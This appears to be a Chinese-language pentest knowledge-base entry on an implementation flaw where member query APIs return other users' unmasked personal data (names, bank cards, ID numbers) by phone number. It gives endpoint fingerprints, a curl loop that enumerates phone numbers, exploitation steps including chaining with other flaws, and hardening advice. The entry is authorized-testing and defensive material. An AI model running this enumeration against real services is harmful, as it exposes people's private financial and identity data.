---
title: 会员隐私批量查询 / 账号枚举（手机号、银行卡）
cve: 无（实现缺陷）
severity: high
cvss: 7.5
product: 客服查询 / 代理报表 / 会员中心接口
versions: 任意
ports: 80, 443
keywords: member, enumeration, 手机号, 银行卡, 隐私, 批量查询
entry: /api/member/info?phone= 逐个返回他人资料
verified: false
sources: 公开资料整理（实现缺陷类，无 CVE）
---

## 指纹

```
/api/member/info?phone=13800138000     /api/user/query?id=
/api/cs/member/search?keyword=         /api/agent/member?phone=
返回体含 realName、bankCard、idCard、balance
```

## 前置条件

- 账号（客服/代理角色更常见，但会员接口也常暴露同名功能）。

## PoC

```http
GET /api/member/info?phone=13800138000 HTTP/1.1
Authorization: Bearer <token>
```

```bash
# 抽查式枚举（限速！只证明可枚举，不建库）
for p in 13800138000 13800138001 13800138002; do
  curl -s "https://target/api/member/info?phone=$p" -H "Authorization: Bearer <token>" \
    | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("data",{}).get("phone"),d.get("data",{}).get("realName"))'
  sleep 2
done
```

## 利用步骤

1. 用自己手机号确认返回自己的资料（基线）。
2. 换一个他人手机号（授权测试名单内）看是否返回姓名/卡号 —— 关键看**是否脱敏**。
3. 判定：未脱敏返回他人 PII ⇒ 隐私泄露；能按 uid/手机号任意查 ⇒ 可批量。
4. 组合：`member-data-enumeration` + `sms-bomb-and-enum.md`（存在性）+ `withdraw-approval-idor.md`（卡号）形成完整链路。
5. 证据：只留 1-2 条且脱敏；报告写"可枚举的字段集合 + 建议脱敏规则"。

## 修复与缓解（加固）

- 查询类接口强制鉴权 + 角色 + 行级鉴权；客服查询要留审计（谁查了谁）。
- PII 默认脱敏（姓名首字、卡号后四位、身份证中间打码）；批量查询需二次授权。
- 接口限速 + 异常查询告警（同一账号高频查询不同手机号）。

## 参考

- OWASP WSTG-IDNT-04；《个人信息保护法》最小必要原则（加固项）。
